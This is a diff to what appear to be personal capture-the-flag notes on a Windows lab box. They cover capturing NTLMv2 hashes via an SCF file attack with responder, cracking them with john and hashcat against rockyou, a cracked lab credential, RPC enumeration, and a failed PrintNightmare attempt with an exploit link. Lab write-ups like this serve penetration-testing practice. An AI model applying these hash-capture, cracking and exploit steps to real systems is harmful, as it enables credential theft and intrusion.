@@ -70,12 +70,15 @@ Command=ToggleDesktop
 **responder works much better than msfconsole::**  see::![proper_ntlmv2_hash](Screenshots/driver_scf_smb.png)
 
 + john --format=nt hash.txt
-+ hashcat -m 1000 -a 3 hash.txt::
+  + hashcat -m 5600 ntlmhashes.txt /usr/share/wordlists/rockyou.txt (seclist:: milw0rmdictionary.txt >> rockyou.txt )
+    + creds: tony:liltony
 
-+Creds:: tony or driver?:
++ rpcdump.py 10.10.11.106 -p 135 :: provides multiple vuln services in hacktricks                                                      1 ⨯
 
-$ rpcdump.py 10.10.11.106 -p 135 :: provides multiple vuln services in hacktricks                                                      1 ⨯
++TODO: impacket.dcerpc.v5.rprn.DCERPCSessionError: RPRN SessionError: code: 0x3a - ERROR_BAD_NET_RESP - The specified server cannot perform the requested operation.
+Can't run printernightmare CVE-2021-1675
 
+[](https://github.com/cube0x0/CVE-2021-1675)
 [](https://book.hacktricks.xyz/pentesting/135-pentesting-msrpc)
 [scf_file_attacks](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/)
 [cracking_windows_hashes](https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4)
